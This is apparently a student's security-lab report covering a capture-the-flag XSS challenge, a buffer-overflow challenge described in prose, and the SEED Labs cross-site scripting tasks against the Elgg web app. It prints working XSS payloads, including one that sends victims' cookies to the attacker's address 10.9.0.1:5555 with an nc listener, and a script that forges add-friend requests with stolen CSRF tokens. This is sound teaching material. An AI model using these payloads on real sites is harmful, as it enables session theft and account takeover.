# Work performed during the week #10

## CTF

### Goal

- The objective is to attack the web application with a Cross-Site Scripting (XSS), in order to allow the administrator to provide a flag.

### Challenge 1

- The admin visit the page with our justification and mark the request as not accepted by clicking on button "Mark request as read" or accepted on button "Give the flag".

- The justification has a vulnerability that allows us to input a script that the web app will run, so we input ``<script>document.getElementById('giveflag').click();</script>``.

- This way the button "Give the flag" is clicked when the admin visit the page accepting the request to give the flag.

### Challenge 2

- We started by analysing the program using ``checksec``. After this, we looked through the program's code in search of a vulnerability.
- We discovered that it was using ``gets`` to read the input and was storing in the variable ``buffer[100]``. This presented the opportunity to try a buffer overflow attack.
- Using athe fundamentals behind a buffer overflow attack and some scripts from previous ctfs, we managed to inject our shellcode into the program and open a shell.
 

## SeedLab

### Task 1

- For the task 1, we choose to login with the user Alice. After we logged in we went to edit profile and in the input for brief discreption we add the script ``<script>alert('XSS');</script>``.

- This way, every time the brief discreption field is asked for a web page, it will execute the alert we inserted. This justifies why even in the list of users the alert is triggered. Because this list not only the users, but the brief discreption of each user.

### Task 2

- Still using user Alice, we went to edit profile and in the input for brief discreption we add another script. Instead of the script ``<script>alert('XSS');</script>`` we use the script ``<script>alert(document.cookie);</script>``, so we can now print the cookies.

- The result of the alert is ``pvisitor=a6b4dccd-99d9-4a92-a50a-9a850b3592ab; Elgg=i0mr1o4tlhlimds4ncd0da5nb7``.

### Task 3

- In this task, instead of only the user can see the cookies, we want to send an HTTP request with the cookies appended to the request in order so see them.
- In order to do that we user a script that do that, `` <script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
</script> ``.
- This sript inserts the img tag, the browser tries to load the image from the URL in the src field, this results in an HTTP GET request sent to our machine, with the cookies to the port 5555 of our machine (with IP address 10.9.0.1).
- We use the program ``nc -lknv 5555``, to have a TCP server that listens for a connection on the specified port (5555).
- This program will print out the HTTP request with the cookies of the client.

### Task 4

- In this task, we will use a script that adds Samy as a friend to any other user that visits Samy’s page.
- First we find out how a legitimate user adds a friend in Elgg.
- We use Firefox’s ``HTTP inspection tool`` to help us get what are sent to the server when a user adds a friend.
- Inspectioning the contents of the HTTP GET request that was sent when the add friend button was clicked, we identify all the parameters in the request.
- Finding that the data is attached to the URL ``http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1642154629&__elgg_token=cjBSuLpxRMRNZH0Uoq_zug&__elgg_ts=1642154629&__elgg_token=cjBSuLpxRMRNZH0Uoq_zug``.
- The parameters are placed after the URL by``?`` and separated by ``&``, that parameters being, first ``friend=59`` and the variables ``__elgg_ts``, ``__elgg_token``. 
- The script create a GET request to the URL ``http://www.seed-server.com/action/friends/add`` with the parameters ``friend=59``, ``'__elgg_ts='+elgg.security.token.__elgg_ts;``, ``'__elgg_token='+elgg.security.token.__elgg_token;``.

```
<script type='text/javascript'> 
    window.onload = function () {
        var Ajax=null;
        var ts='&__elgg_ts='+elgg.security.token.__elgg_ts; ➀
        var token='&__elgg_token='+elgg.security.token.__elgg_token; ➁
        var sendurl='http://www.seed-server.com/action/friends/add?friend=59'+ts+token;
        Ajax=new XMLHttpRequest();
        Ajax.open('GET', sendurl, true);
        Ajax.send();
    }
</script>
```
- Sending out the same HTTP request as add-friend HTTP request.
- We placed the script in the ``About Me`` field of Samy’s profile page, after we clicking on option ``Edit HTML`` to enable Text mode.
- Now any other user that visits Samy’s page, will add Samy as a friend.

- Question 1:
The Lines ➀ and ➁, are needed for getting the values of the __elgg_ts and __elgg_token parameters, because they change every time a page is loaded so they need to be accessed dynamically in order to get the correct values.
- Question 2:
If the Elgg application only provided the Editor mode for the ``About me`` field, the attack would not be successful because the The Editor mode adds extra HTML code to the text typed into the field and we do not want any extra code added to our script in order to work.






